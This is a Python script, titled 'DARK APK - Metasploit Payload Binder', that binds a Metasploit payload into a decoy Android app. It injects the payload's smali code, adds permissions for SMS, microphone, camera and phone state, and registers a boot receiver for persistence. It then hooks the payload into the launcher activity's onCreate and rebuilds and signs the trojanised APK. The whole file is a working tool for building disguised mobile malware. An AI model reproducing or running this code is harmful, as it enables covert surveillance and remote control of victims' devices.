#!/usr/bin/env python3

import os
import subprocess
import sys
from pathlib import Path
from lxml import etree as ET

def show_banner():
    banner = r"""
       ___  _   _  ____ _  __    _    ____  _  __
      |   \| | | |/ ___| |/ /   / \  |  _ \| |/ /
      | |) | |_| | |   | ' /   / _ \ | | | | ' / 
      |___/ \___/|_|   |_|\_\ /_/ \_\|_| |_|_|\_\

    """
    print(banner)
    print("      DARK APK - Metasploit Payload Binder")
    print("      Author: vector (2025)\n")

def check_dependencies():
    tools = ['apktool', 'apksigner', 'zipalign']
    for tool in tools:
        if subprocess.run(['which', tool], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode != 0:
            print(f"[ERROR] {tool} is not installed. Please install it first.")
            sys.exit(1)

def decompile_apk(apk_path, output_dir):
    if not os.path.exists(apk_path):
        print(f"[ERROR] APK {apk_path} not found!")
        sys.exit(1)

    if os.path.exists(output_dir):
        print(f"[*] Removing old decompiled directory: {output_dir}")
        subprocess.run(['rm', '-rf', output_dir])

    print(f"[*] Decompiling APK: {apk_path}")
    subprocess.run(['apktool', 'd', apk_path, '-o', output_dir, '-f'], check=True)

def inject_payload(decoy_apk_dir, payload_apk_dir):
    payload_path = Path(payload_apk_dir)

    if payload_path.suffix == ".apk":
        print(f"[*] Detected APK file as payload: {payload_apk_dir}")
        temp_payload_dir = "payload_temp"
        if os.path.exists(temp_payload_dir):
            subprocess.run(['rm', '-rf', temp_payload_dir])
        subprocess.run(['apktool', 'd', payload_apk_dir, '-o', temp_payload_dir, '-f'], check=True)
        payload_path = Path(temp_payload_dir)

    metasploit_smali_dir = payload_path / 'smali' / 'com' / 'metasploit'
    decoy_smali_dir = Path(decoy_apk_dir) / 'smali' / 'com'

    if not metasploit_smali_dir.exists():
        print(f"[ERROR] Metasploit payload smali files not found at {metasploit_smali_dir}")
        sys.exit(1)

    print(f"[*] Injecting payload into {decoy_apk_dir}")
    subprocess.run(['cp', '-r', str(metasploit_smali_dir), str(decoy_smali_dir)], check=True)

def modify_manifest(manifest_path):
    print(f"[*] Modifying AndroidManifest.xml: {manifest_path}")
    try:
        parser = ET.XMLParser(recover=True)
        tree = ET.parse(manifest_path, parser=parser)
        root = tree.getroot()

       


        permissions = [
            "android.permission.INTERNET",
            "android.permission.ACCESS_NETWORK_STATE",
            "android.permission.ACCESS_WIFI_STATE",
            "android.permission.READ_SMS",
            "android.permission.RECORD_AUDIO",
            "android.permission.CAMERA",
            "android.permission.SEND_SMS",
            "android.permission.READ_PHONE_STATE"
        ]

        for perm in permissions:
            perm_element = ET.Element("uses-permission")
            perm_element.set("{http://schemas.android.com/apk/res/android}name", perm)
            root.insert(0, perm_element)

        application = root.find('application')
        if application is None:
            print("[ERROR] No application tag found in manifest.")
            sys.exit(1)

        service_element = ET.Element("service")
        service_element.set("{http://schemas.android.com/apk/res/android}name", "com.metasploit.stage.MainService")
        application.append(service_element)

        receiver_element = ET.Element("receiver")
        receiver_element.set("{http://schemas.android.com/apk/res/android}name", "com.metasploit.stage.MainBroadcastReceiver")
        intent_filter = ET.SubElement(receiver_element, "intent-filter")
        action = ET.SubElement(intent_filter, "action")
        action.set("{http://schemas.android.com/apk/res/android}name", "android.intent.action.BOOT_COMPLETED")
        application.append(receiver_element)

        tree.write(manifest_path, encoding="utf-8", xml_declaration=True)

    except Exception as e:
        print(f"[ERROR] Failed to modify manifest: {e}")
        sys.exit(1)

def hook_payload_in_main_activity(decoy_apk_dir):
    manifest_path = Path(decoy_apk_dir) / "AndroidManifest.xml"
    print("[*] Parsing AndroidManifest.xml to find entry point...")
    try:
        parser = ET.XMLParser(recover=True)
        tree = ET.parse(manifest_path, parser=parser)
        root = tree.getroot()
        application = root.find('application')
        if application is None:
            print("[ERROR] Application block not found in manifest.")
            sys.exit(1)

        for activity in application.findall('activity'):
            for intent_filter in activity.findall('intent-filter'):
                actions = intent_filter.findall('action')
                for action in actions:
                    if action.attrib.get('{http://schemas.android.com/apk/res/android}name') == 'android.intent.action.MAIN':
                        activity_name = activity.attrib.get('{http://schemas.android.com/apk/res/android}name')
                        print(f"[*] Found launcher activity: {activity_name}")

                        if activity_name.startswith("."):
                            activity_name = activity_name[1:]
                        smali_path = Path(decoy_apk_dir) / "smali" / Path(*activity_name.split("."))
                        smali_file = smali_path.with_suffix(".smali")

                        if not smali_file.exists():
                            print(f"[ERROR] Smali file not found for activity: {smali_file}")
                            sys.exit(1)

                        print(f"[*] Found smali file for launcher: {smali_file}")

                        inside_oncreate = False
                        with open(smali_file, 'r') as f:
                            lines = f.readlines()

                        new_lines = []
                        injected = False
                        for line in lines:
                            new_lines.append(line)
                            if ".method public onCreate" in line:
                                inside_oncreate = True
                            if inside_oncreate and "invoke-super" in line and not injected:
                                new_lines.append("    invoke-static {}, Lcom/metasploit/stage/Payload;->start()V\n")
                                injected = True

                        if not injected:
                            print("[ERROR] Could not inject payload properly inside onCreate method.")
                            sys.exit(1)

                        with open(smali_file, 'w') as f:
                            f.writelines(new_lines)

                        return
        print("[ERROR] No launcher activity found in manifest.")
        sys.exit(1)

    except Exception as e:
        print(f"[ERROR] Failed to parse AndroidManifest.xml: {e}")
        sys.exit(1)

# Rest of the code remains unchanged

def rebuild_apk(decoy_apk_dir, output_apk_path):
    print(f"[*] Rebuilding APK: {output_apk_path}")
    subprocess.run(['apktool', 'b', decoy_apk_dir, '-o', output_apk_path], check=True)

def sign_apk(keystore_path, keystore_alias, apk_path):
    print(f"[*] Signing APK: {apk_path}")
    subprocess.run(['apksigner', 'sign', '--ks', keystore_path, '--ks-key-alias', keystore_alias, apk_path], check=True)

def zipalign_apk(output_apk_path):
    aligned_apk_path = output_apk_path.replace(".apk", "_aligned.apk")
    print(f"[*] Zipaligning APK: {aligned_apk_path}")
    subprocess.run(["zipalign", "-p", "4", output_apk_path, aligned_apk_path], check=True)
    print(f"[*] Final APK: {aligned_apk_path}")

def cleanup_temp_files():
    folders_to_delete = ["decoy_apk", "payload_temp"]
    for folder in folders_to_delete:
        if os.path.exists(folder):
            print(f"[*] Cleaning up: {folder}")
            subprocess.run(["rm", "-rf", folder])

def main():
    show_banner()

    if len(sys.argv) != 7:
        print(f"Usage: {sys.argv[0]} <decoy_apk_path> <payload_apk_path> <output_apk_path> <keystore_path> <keystore_alias> <keystore_password>")
        sys.exit(1)

    decoy_apk_path = sys.argv[1]
    payload_apk_path = sys.argv[2]
    output_apk_path = sys.argv[3]
    keystore_path = sys.argv[4]
    keystore_alias = sys.argv[5]
    keystore_password = sys.argv[6]

    check_dependencies()
    decoy_apk_dir = "decoy_apk"

    decompile_apk(decoy_apk_path, decoy_apk_dir)
    inject_payload(decoy_apk_dir, payload_apk_path)
    modify_manifest(Path(decoy_apk_dir) / 'AndroidManifest.xml')
    hook_payload_in_main_activity(decoy_apk_dir)
    rebuild_apk(decoy_apk_dir, output_apk_path)
    sign_apk(keystore_path, keystore_alias, output_apk_path)
    zipalign_apk(output_apk_path)
    cleanup_temp_files()

    print("[*] Process complete. Your aligned APK is ready!")

if __name__ == '__main__':
    main()
